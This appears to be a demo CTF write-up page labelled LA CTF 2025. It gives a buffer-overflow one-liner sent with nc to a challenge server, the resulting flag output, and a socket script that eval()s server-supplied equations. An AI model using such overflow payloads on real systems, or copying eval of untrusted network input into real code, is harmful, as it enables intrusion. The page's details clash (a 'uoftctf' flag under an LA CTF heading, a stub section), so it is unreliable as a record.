---
title: "demo1"
event: "LA CTF 2025"
category: "Forensics"
date: "2025-02-18"
difficulty: "Easy"
image: ""
---

# Table of Contents
- [Forensics](#forensics)
  - [Memory Analysis Challenge](#memory-analysis-challenge)
- [PWN](#pwn)
  - [Baby Pwn](#baby-pwn)
- [Misc](#misc)
  - [Math Test](#math-test)

# Forensics

## Memory Analysis Challenge

This challenge involved analyzing a memory dump using volatility...

![Challenge Screenshot](/writeups/LA-CTF-2025/images/image1.png)

# PWN

## Baby Pwn

Description: Here's a baby pwn challenge for you to try out. Can you get the flag?

Connection: `nc 34.162.142.123 5000`

Author: atom

### Solution

```bash
┌──(kali㉿LAPTOP-50LBEJ2I)-[~/ctf]
└─$  python3 -c "print('A' * 72 + '\x66\x11\x40\x00\x00\x00\x00\x00')" | nc 34.162.142.123 5000
```

Output:
```bash
Welcome to the Baby Pwn challenge!
Address of secret: 0x401166
Enter some text: You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAf@
Congratulations! Here is your flag: uoftctf{buff3r_0v3rfl0w5_4r3_51mp13_1f_y0u_kn0w_h0w_t0_d0_1t}
```

# Misc

## Math Test

Description: Complete this simple math test to get the flag.

Connection: `nc 34.66.235.106 5000`

Author: White

### Solution

```python
import socket
import re

def solve_equation(equation):
    return eval(equation)

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("34.66.235.106", 5000))
    
    while True:
        data = s.recv(4096).decode()
        print(data.strip())  # Print server message
        
        if not data:
            break
            
        match = re.search(r"Question: ([-0-9]+\s*[-+*/]+\s*[-0-9]+(?:\s*[-+*/]+\s*[-0-9]+)*)", data)
        if match:
            equation = match.group(1)
            answer = solve_equation(equation)
            s.send(f"{int(answer)}\n".encode())
            print(f"Answer: {int(answer)}")
    
    s.close()

if __name__ == "__main__":
    main()